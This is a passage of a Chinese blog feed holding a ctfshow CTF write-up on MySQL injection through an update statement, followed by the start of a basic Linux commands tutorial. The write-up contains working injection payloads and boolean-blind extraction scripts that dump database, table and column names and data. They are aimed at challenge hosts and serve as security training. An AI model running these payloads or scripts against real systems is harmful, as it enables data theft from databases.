class="keyword">update</span> ctfshow_user <span class="keyword">set</span> pass <span class="operator">=</span> <span class="string">&#x27;\&#x27;</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;,username=database()#&#x27;</span>;</span><br><span class="line">通过第一个和第三个单引号闭合后,最后一个单引号被注释,即形成如下语句</span><br><span class="line"><span class="keyword">update</span> ctfshow_user <span class="keyword">set</span> pass <span class="operator">=</span> <span class="string">&#x27;string&#x27;</span>,username<span class="operator">=</span>database()</span><br><span class="line">注意:在 <span class="keyword">SQL</span> 中，\<span class="string">&#x27; 是用来表示单引号的一种方式。它告诉解析器，接下来的单引号是字符串的一部分，而不是字符串的结束标志,因此第一个和第三个单引号才能成功闭合</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113150942930.png" alt="image-20250113150942930"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113150951860.png" alt="image-20250113150951860"></p><p>接下来就是修改语句正常注入</p><p>爆表名(注意这里table_schema不能写成’ctfshow_web’,因为单引号被过滤了)</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113152339009.png"></p><p>PS:做完法一用脚本的时候才发现可以username中可以使用单引号，应该是只针对了password中的单引号过滤</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctfshow_web&#x27;</span>)#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113154404500.png" alt="image-20250113154404500"></p><p>爆列名(通过limit绕过表名)</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">2</span>,<span class="number">1</span>))#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113152907436.png" alt="image-20250113152907436"></p><p>爆flag</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> flagass233 <span class="keyword">from</span> flag233333)#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113153300898.png" alt="image-20250113153300898"></p><h3 id="法二-布尔盲注-2"><a href="#法二-布尔盲注-2" class="headerlink" title="法二:布尔盲注"></a>法二:布尔盲注</h3><p>脚本直接一把梭，才发现应该是只针对password中单引号，因此直接上脚本(环境爆了换了一个环境)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force</span>(<span class="params">url</span>):</span><br><span class="line">    x= <span class="number">0</span></span><br><span class="line">    find=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">      found_char=<span class="literal">False</span></span><br><span class="line">      <span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz123456789&#123;0_-,&#125;&#x27;</span>:<span class="comment">#根据需要更改字典</span></span><br><span class="line">         payload = &#123;<span class="string">&#x27;password&#x27;</span> : <span class="string">f&quot;<span class="subst">&#123;x&#125;</span>&quot;</span>,<span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;0&#x27;</span>+<span class="string">f&quot;&#x27; or if(substr(database(),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,true,false);#&quot;</span>&#125;   </span><br><span class="line">         r = requests.post(url=url,data=payload).text</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">if</span>(<span class="string">r&#x27;\u66f4\u65b0\u6210\u529f&#x27;</span> <span class="keyword">in</span> r):</span><br><span class="line">            find += char</span><br><span class="line">            <span class="built_in">print</span>(find)</span><br><span class="line">            found_char = <span class="literal">True</span></span><br><span class="line">            x+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符，库名为&quot;</span>+find)</span><br><span class="line">         x+=<span class="number">1</span></span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> find</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force1</span>(<span class="params">url</span>):</span><br><span class="line">    x= <span class="number">0</span></span><br><span class="line">    find=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">      found_char=<span class="literal">False</span></span><br><span class="line">      <span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz123456789&#123;0_-,&#125;&#x27;</span>:<span class="comment">#根据需要更改字典</span></span><br><span class="line">         payload = &#123;<span class="string">&#x27;password&#x27;</span> : <span class="string">f&quot;<span class="subst">&#123;x&#125;</span>&quot;</span>,<span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;0&#x27;</span>+<span class="string">f&quot;&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;database&#125;</span>&#x27;),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,true,false);#&quot;</span>&#125;   </span><br><span class="line">         r = requests.post(url=url,data=payload).text</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">if</span>(<span class="string">r&#x27;\u66f4\u65b0\u6210\u529f&#x27;</span> <span class="keyword">in</span> r):</span><br><span class="line">            find += char</span><br><span class="line">            <span class="built_in">print</span>(find)</span><br><span class="line">            found_char = <span class="literal">True</span></span><br><span class="line">            x+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符，表名为&quot;</span>+find)</span><br><span class="line">         x+=<span class="number">1</span></span><br><span class="line">         <span class="keyword">break</span>      </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force2</span>(<span class="params">url</span>):</span><br><span class="line">    x= <span class="number">0</span></span><br><span class="line">    find=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">      found_char=<span class="literal">False</span></span><br><span class="line">      <span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz123456789&#123;0_-,&#125;&#x27;</span>:<span class="comment">#根据需要更改字典</span></span><br><span class="line">         payload = &#123;<span class="string">&#x27;password&#x27;</span> : <span class="string">f&quot;<span class="subst">&#123;x&#125;</span>&quot;</span>,<span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;0&#x27;</span>+<span class="string">f&quot;&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27;),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,true,false);#&quot;</span>&#125;   </span><br><span class="line">         r = requests.post(url=url,data=payload).text</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">if</span>(<span class="string">r&#x27;\u66f4\u65b0\u6210\u529f&#x27;</span> <span class="keyword">in</span> r):</span><br><span class="line">            find += char</span><br><span class="line">            <span class="built_in">print</span>(find)</span><br><span class="line">            found_char = <span class="literal">True</span></span><br><span class="line">            x+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符，列名为&quot;</span>+find)</span><br><span class="line">         x+=<span class="number">1</span></span><br><span class="line">         <span class="keyword">break</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force3</span>(<span class="params">url</span>):</span><br><span class="line">    x= <span class="number">0</span></span><br><span class="line">    find=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">      found_char=<span class="literal">False</span></span><br><span class="line">      <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):<span class="comment">#根据需要更改字典</span></span><br><span class="line">         payload = &#123;<span class="string">&#x27;password&#x27;</span> : <span class="string">f&quot;<span class="subst">&#123;x&#125;</span>&quot;</span>,<span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;0&#x27;</span>+<span class="string">f&quot;&#x27; or if(ascii(substr((select <span class="subst">&#123;column&#125;</span> from <span class="subst">&#123;table&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;char&#125;</span>,true,false);#&quot;</span>&#125;   </span><br><span class="line">         r = requests.post(url=url,data=payload).text</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">if</span>(<span class="string">r&#x27;\u66f4\u65b0\u6210\u529f&#x27;</span> <span class="keyword">in</span> r):</span><br><span class="line">            find += <span class="built_in">chr</span>(char)</span><br><span class="line">            <span class="built_in">print</span>(find)</span><br><span class="line">            found_char = <span class="literal">True</span></span><br><span class="line">            x+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,flag为&quot;</span>+find)</span><br><span class="line">         x+=<span class="number">1</span></span><br><span class="line">         <span class="keyword">break</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   <span class="comment">#指定url</span></span><br><span class="line">   url=<span class="string">&#x27;http://f5d6873c-e968-44c4-97df-f72278a12e84.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">   database=force(url)</span><br><span class="line">   force1(url)</span><br><span class="line">   table=<span class="built_in">input</span>(<span class="string">&quot;请输入表名:&quot;</span>)</span><br><span class="line">   force2(url)</span><br><span class="line">   column=<span class="built_in">input</span>(<span class="string">&quot;请输入列名:&quot;</span>)</span><br><span class="line">   force3(url)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113155057972.png" alt="image-20250113155057972"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113155105473.png" alt="image-20250113155105473"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113155116184.png" alt="image-20250113155116184"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113160421164.png" alt="image-20250113160421164"></p><h2 id="web234-过滤单引号"><a href="#web234-过滤单引号" class="headerlink" title="web234(过滤单引号)"></a>web234(过滤单引号)</h2><p>测试按照上题的直接闭合也能打通，但是就是username和password中单引号都被过滤了，用上题的payload打通</p><p>爆库名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>database()#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113163002351.png" alt="image-20250113163002351"></p><p>爆表名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113163042795.png" alt="image-20250113163042795"></p><p>爆列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">2</span>,<span class="number">1</span>))#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113163121730.png" alt="image-20250113163121730"></p><p>爆flag</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> flagass23s3 <span class="keyword">from</span> flag23a)#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113163247408.png" alt="image-20250113163247408"></p><p>但是由于username中单引号也被过滤了，所以不能使用布尔盲注了</p><h2 id="web235-过滤-or"><a href="#web235-过滤-or" class="headerlink" title="web235(过滤+or)"></a>web235(过滤+or)</h2><p>按照上题方式也能打通，但是这里将or进行过滤，就涉及到information_schema表无法使用，即变成无列名注入</p><p>首先爆库名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>database()#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113170910881.png" alt="image-20250113170910881"></p><p>爆表名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats)#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113171402658.png" alt="image-20250113171402658"></p><p>爆数据</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> `<span class="number">2</span>` <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag23a1)a limit <span class="number">1</span>,<span class="number">1</span>)#</span><br><span class="line">`<span class="number">2</span>`:表示是第二列(为什么是直接输出第二列问就是经验)</span><br><span class="line">(<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag23a1)a:将<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>联合到flag23a1中作为第一排，a作为结合集的别名</span><br><span class="line">limit <span class="number">1</span>,<span class="number">1</span>:跳过第一排，直接从第二排开始输出</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113172704721.png" alt="image-20250113172704721"></p><h2 id="web236-过滤-flag"><a href="#web236-过滤-flag" class="headerlink" title="web236(过滤+flag)"></a>web236(过滤+flag)</h2><p>通过子查询语句就可以绕过查询语句中的flag，无列名查询还是和上题相同</p><p>爆库名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>database()#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113175509174.png" alt="image-20250113175509174"></p><p>爆表名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats)#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113175543668.png" alt="image-20250113175543668"></p><p>爆flag</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">错误示例，这里我还存疑，明明(<span class="keyword">select</span> table_name <span class="keyword">from</span> mysql.innodb_table_stats limit <span class="number">2</span>,<span class="number">1</span>)可以正常回显flaga，但是拼接到语句中反正不行，去网上找了wp也没有成功绕过的，看到的几篇都是直接使用flaga，意味着这个题没有过滤输入中的flaga</span><br><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> `<span class="number">2</span>` <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> table_name <span class="keyword">from</span> mysql.innodb_table_stats limit <span class="number">2</span>,<span class="number">1</span>))a limit <span class="number">1</span>,<span class="number">1</span>)#</span><br><span class="line">正确payload</span><br><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> `<span class="number">2</span>` <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flaga)a limit <span class="number">1</span>,<span class="number">1</span>)#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113182025616.png" alt="image-20250113182025616"></p><blockquote><p>这个题说的是过滤了flag，然后用上一题的姿势一样可以过。听其他大师傅说是输出过滤，不是输入过滤，但是因为flag格式改了，以前应该是flag{}，然后会被过滤掉，然后现在这个就没啥影响。<br>然后我们还是搞下预期解吧，就改下输出的方式。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> hex(group_concat(`<span class="number">2</span>`)) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flaga)x)#</span><br></pre></td></tr></table></figure></blockquote><hr><h2 id="PS-数据库名称敏感问题"><a href="#PS-数据库名称敏感问题" class="headerlink" title="PS:数据库名称敏感问题"></a>PS:数据库名称敏感问题</h2><p>做到这里时蒙师傅提了个问题，在他脚本出来的库名全是大写字母</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/00ce90d8064b91d8ae00f25711604231.jpg" alt="00ce90d8064b91d8ae00f25711604231"></p><p>找了挺久也没找出脚本的问题，推测是数据库的问题，在进行测试之后发现在数据库查询时，如果是查询库名、表名、列名时对于大小写不敏感，即弱比较；而在使用库名、表名、列名查询数据时对大小写是敏感的。比如ctfshow_web和ctfshow_weB,在通过脚本爆库名时如果字典选择不恰当都有可能出现，但是只有ctfshow_web可以正确查找后面的表名。由此不禁想到如果表名是大小写混合，那应该如何才能爆出正确表名呢，在今天刷极客大挑战2019时的finalsql表名就是F1naI1y，如果只是拿f1nal1y去爆那就没有结果。因此正确姿势是用字符的ASCII来进行比较，然后再用chr(j)来加上字符，这样出来的就是正确名称了。部分脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">force</span>(<span class="params">url</span>):</span><br><span class="line">    find=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">      found_char=<span class="literal">False</span></span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):<span class="comment">#根据需要更改字典</span></span><br><span class="line">         payload = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">f&quot;1^(ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>)&quot;</span>&#125;   </span><br><span class="line">         r = requests.get(url=url,params=payload).text</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">if</span>(<span class="string">&#x27;ERROR&#x27;</span> <span class="keyword">in</span> r):</span><br><span class="line">            find += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(find)</span><br><span class="line">            found_char = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符，库名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> find</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> ctfshow </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux常见指令</title>
      <link href="/2024/12/02/linux%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4/"/>
      <url>/2024/12/02/linux%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="1-ls-列出当前目录所有文件"><a href="#1-ls-列出当前目录所有文件" class="headerlink" title="1.ls:列出当前目录所有文件"></a>1.ls:列出当前目录所有文件</h1><h2 id="ls-l-列出文件及属性"><a href="#ls-l-列出文件及属性" class="headerlink" title="ls -l:列出文件及属性"></a>ls -l:列出文件及属性</h2><p><strong>第一列</strong></p><p>第1个字母为d表示为目录，为-表示为普通文件</p><p>2-4个字母：rwx表示read,write,执行，表示文件所有者权限</p><p>5-7个字母:表示该组内其他用户权限</p><p>8-10个字母:表示除该组其他用户权限</p><p><strong>第五列</strong></p><p>表示文件大小</p><p><strong>第六七八列</strong></p><p>表示修改时间</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/linux%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4/1.png"></p><h2 id="ls-a-查看隐藏文件"><a href="#ls-a-查看隐藏文件" class="headerlink" title="ls -a:查看隐藏文件"></a>ls -a:查看隐藏文件</h2><p>第一个字符为.表示为隐藏文件</p><h2 id="ls-la-列出文件及属性-包括隐藏文件"><a href="#ls-la-列出文件及属性-包括隐藏文件" class="headerlink" title="ls -la:列出文件及属性(包括隐藏文件)"></a>ls -la:列出文件及属性(包括隐藏文件)</h2><p><strong>注:大部分命令行以ll代表ls -l的缩写</strong></p><h1 id="2-cd-进入一个目录-格式cd-目录名"><a href="#2-cd-进入一个目录-格式cd-目录名" class="headerlink" title="2.cd:进入一个目录(格式cd 目录名)"></a><strong>2.cd:进入一个目录(格式cd 目录名)</strong></h1><h2 id="cd-回到上一层目录"><a href="#cd-回到上一层目录" class="headerlink" title="cd ..:回到上一层目录"></a>cd ..:回到上一层目录</h2><h2 id="cd-进入当前目录"><a href="#cd-进入当前目录" class="headerlink" title="cd .:进入当前目录"></a>cd .:进入当前目录</h2><h2 id="cd-进入上上层目录"><a href="#cd-进入上上层目录" class="headerlink" title="cd ..&#x2F;..:进入上上层目录"></a>cd ..&#x2F;..:进入上上层目录</h2><h2 id="cd-进入上一次进入的目录"><a href="#cd-进入上一次进入的目录" class="headerlink" title="cd -:进入上一次进入的目录"></a>cd -:进入上一次进入的目录</h2><h1 id="3-pwd-打印当前路径"><a href="#3-pwd-打印当前路径" class="headerlink" title="3.pwd:打印当前路径"></a><strong>3.pwd:打印当前路径</strong></h1><h1 id="4-cat-tail-head-查看文件内容"><a href="#4-cat-tail-head-查看文件内容" class="headerlink" title="4.cat&#x2F;tail&#x2F;head:查看文件内容"></a><strong>4.cat&#x2F;tail&#x2F;head</strong>:查看文件内容</h1><h2 id="cat-文件名-查看当前文件内容"><a href="#cat-文件名-查看当前文件内容" class="headerlink" title="cat 文件名:查看当前文件内容"></a><strong>cat 文件名:查看当前文件内容</strong></h2><p><strong>快捷键:</strong></p><p><strong>Tab键:<strong>对目录中名字唯一的文件，如README，输入R后</strong>按Tab键自动补齐</strong></p><p><strong>上下键:自动输入上一个或下一个使用的命令</strong></p><h3 id="head-文件名-只看文件开头内容"><a href="#head-文件名-只看文件开头内容" class="headerlink" title="head 文件名:只看文件开头内容"></a><strong>head 文件名:只看文件开头内容</strong></h3><h3 id="head-–lines-x-文件名-只看文件开头前x行内容"><a href="#head-–lines-x-文件名-只看文件开头前x行内容" class="headerlink" title="head –lines&#x3D;x 文件名:只看文件开头前x行内容"></a><strong>head –lines&#x3D;x 文件名:只看文件开头前x行内容</strong></h3><h3 id="tail-文件名-只看文件结尾内容"><a href="#tail-文件名-只看文件结尾内容" class="headerlink" title="tail 文件名:只看文件结尾内容"></a><strong>tail 文件名:只看文件结尾内容</strong></h3><h3 id="tail-–lines-x-文件名-只看文件结尾前x行内容"><a href="#tail-–lines-x-文件名-只看文件结尾前x行内容" class="headerlink" title="tail –lines&#x3D;x 文件名:只看文件结尾前x行内容"></a><strong>tail –lines&#x3D;x 文件名:只看文件结尾前x行内容</strong></h3><h1 id="5-less-more-查看全文"><a href="#5-less-more-查看全文" class="headerlink" title="5.less&#x2F;more:查看全文"></a><strong>5.less&#x2F;more</strong>:查看全文</h1><h3 id="less-文件名-查看全文"><a href="#less-文件名-查看全文" class="headerlink" title="**less 文件名:查看全文"></a>**less 文件名:查看全文</h3><p><strong>按q退出,可前后滚动</strong></p><h3 id="more-文件名-查看全文"><a href="#more-文件名-查看全文" class="headerlink" title="more 文件名:查看全文"></a><strong>more 文件名:查看全文</strong></h3><p><strong>按q退出，Linux只可向下滚动</strong></p><h1 id="6-nano-vim-进入文本编辑器"><a href="#6-nano-vim-进入文本编辑器" class="headerlink" title="6.nano&#x2F;vim:进入文本编辑器"></a><strong>6.nano&#x2F;vim</strong>:进入文本编辑器</h1><p><strong>(注:按i进入insert模式才可进行修改,按esc键退出insert模式,:q!强制退出编辑器,:wq编辑后退出编辑器)</strong></p><h1 id="7-file-查看文件属性-格式file-文件名"><a href="#7-file-查看文件属性-格式file-文件名" class="headerlink" title="7.file:查看文件属性(格式file 文件名)"></a><strong>7.file:查看文件属性(格式file 文件名)</strong></h1><h1 id="8-where-查看文件路径-格式where-文件名"><a href="#8-where-查看文件路径-格式where-文件名" class="headerlink" title="8.where:查看文件路径(格式where 文件名)"></a><strong>8.where:查看文件路径(格式where 文件名)</strong></h1><h1 id="9-echo-打印-格式-echo-打印内容"><a href="#9-echo-打印-格式-echo-打印内容" class="headerlink" title="9.echo:打印(格式 echo 打印内容)"></a><strong>9.echo:打印(格式 echo 打印内容)</strong></h1><h1 id="10-Shell-programming-variables"><a href="#10-Shell-programming-variables" class="headerlink" title="10.Shell programming:variables"></a><strong>10.Shell programming:variables</strong></h1><p><strong>可定义变量(eg 